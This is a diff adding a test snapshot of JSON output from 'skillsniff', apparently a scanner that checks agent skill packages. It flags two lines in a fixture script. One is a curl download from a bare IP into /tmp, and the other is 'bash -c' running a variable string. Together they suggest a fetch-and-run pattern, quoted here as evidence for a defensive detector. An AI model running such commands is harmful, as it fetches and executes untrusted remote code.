@@ -1,0 +1,69 @@
+---
+source: crates/skillsniff/tests/corpus.rs
+expression: value
+---
+{
+  "coverage": {
+    "agent_config": "ran",
+    "code": "ran",
+    "hidden": "ran",
+    "instructions": "ran"
+  },
+  "findings": [
+    {
+      "advice": "Find where the command text comes from and what it can contain.",
+      "evidence": "bash -c \"$c\"",
+      "explain": "The program, or the text a shell is told to run, is built at run time (a variable, a parameter or an expansion) instead of written out. What runs cannot be read from the code, and a fetched string can end up there.",
+      "locations": [
+        {
+          "file": "scripts/run.sh",
+          "line": 5
+        }
+      ],
+      "rule": "exec.dynamic-command",
+      "severity": "medium",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Runs a command that is not fixed in the code"
+    },
+    {
+      "advice": "Check which hosts it talks to and what it sends.",
+      "evidence": "curl -s http://203.0.113.5/f -o /tmp/f",
+      "explain": "The code sends or fetches data over the network.",
+      "locations": [
+        {
+          "file": "scripts/run.sh",
+          "line": 2
+        }
+      ],
+      "rule": "network.outbound",
+      "severity": "low",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Makes a network request"
+    }
+  ],
+  "review": {
+    "applied": false,
+    "rejected_changes": []
+  },
+  "schema_version": "1",
+  "summary": {
+    "critical": 0,
+    "high": 0,
+    "low": 1,
+    "medium": 1
+  },
+  "target": {
+    "commit": null,
+    "source": "[source]",
+    "tree_sha256": "ebddb27308118f106c2caad1c92cfebff70490741502a0375c2ec8f7eda07539",
+    "type": "skill"
+  },
+  "tool": {
+    "name": "skillsniff",
+    "rules": "2026.11.1",
+    "version": "[version]"
+  },
+  "verdict": "CAUTION"
+}
